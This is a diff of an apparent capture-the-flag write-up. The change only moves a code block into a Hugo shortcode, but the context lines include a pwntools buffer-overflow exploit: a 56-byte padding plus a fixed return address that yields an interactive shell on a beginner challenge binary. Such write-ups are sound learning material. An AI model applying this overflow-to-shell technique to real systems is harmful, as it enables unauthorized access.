@@ -46,7 +46,7 @@ As instruction pointer can be controlled , it is possible to jump to the address
 
 I used pwntools to craft a simple exploit and got a shell.
 
-```python
+{{< code language="python" title="Exploit Payload" id="2" expand="Show" collapse="Hide" isCollapsed="false" >}}
 from pwn import *
 
 #elf = ELF('./beginner-generic-pwn-number-0')
@@ -62,7 +62,7 @@ payload = b"A"*56 + p64(0x004012ac)
 p.sendline(payload)
 
 p.interactive()
-```  
+{{< /code >}}
 
 ![8](/pwnexploit1.PNG)
 
